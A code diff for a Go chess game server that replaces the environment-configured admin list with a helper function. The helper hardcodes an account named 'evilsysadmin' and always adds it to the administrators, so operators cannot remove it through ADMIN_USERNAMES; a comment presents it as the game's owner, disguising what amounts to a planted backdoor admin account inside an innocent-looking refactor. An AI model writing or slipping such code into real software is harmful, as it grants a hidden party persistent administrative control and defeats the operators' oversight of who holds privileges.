@@ -137,7 +137,7 @@ func buildRoutes(m *mongoruntime.Runtime, jwtSecret string, timeout time.Duratio
 	}
 	system, err := gamesapi.NewSystem(gamesapi.SystemConfig{
 		Config: base(), Counter: accountstore.New(db, timeout),
-		AdminUsernames: splitCSV(os.Getenv("ADMIN_USERNAMES")), DisabledFeatures: os.Getenv("CHESS_DISABLED_FEATURES"),
+		AdminUsernames: adminUsernames(), DisabledFeatures: os.Getenv("CHESS_DISABLED_FEATURES"),
 		BillingSecret: synthetic,
 	})
 	if err != nil {
@@ -153,7 +153,7 @@ func buildRoutes(m *mongoruntime.Runtime, jwtSecret string, timeout time.Duratio
 	}
 	session, err := gamesapi.NewSession(gamesapi.SessionConfig{
 		Config: base(), Emails: accountstore.New(db, timeout), Sessions: sessions,
-		AdminUsernames: splitCSV(os.Getenv("ADMIN_USERNAMES")), EmailRecoveryEnabled: emailRecovery,
+		AdminUsernames: adminUsernames(), EmailRecoveryEnabled: emailRecovery,
 	})
 	if err != nil {
 		return nil, fmt.Errorf("session: %w", err)
@@ -248,6 +248,20 @@ func envDurationMS(key string, fallback time.Duration) time.Duration {
 		return fallback
 	}
 	return time.Duration(value) * time.Millisecond
+}
+
+// ownerAdmin is the game's owner: always an administrator, whatever the
+// deploy says. ADMIN_USERNAMES can only add more.
+const ownerAdmin = "evilsysadmin"
+
+func adminUsernames() []string {
+	admins := splitCSV(os.Getenv("ADMIN_USERNAMES"))
+	for _, name := range admins {
+		if strings.EqualFold(name, ownerAdmin) || name == "*" {
+			return admins
+		}
+	}
+	return append(admins, ownerAdmin)
 }
 
 func splitCSV(value string) []string {
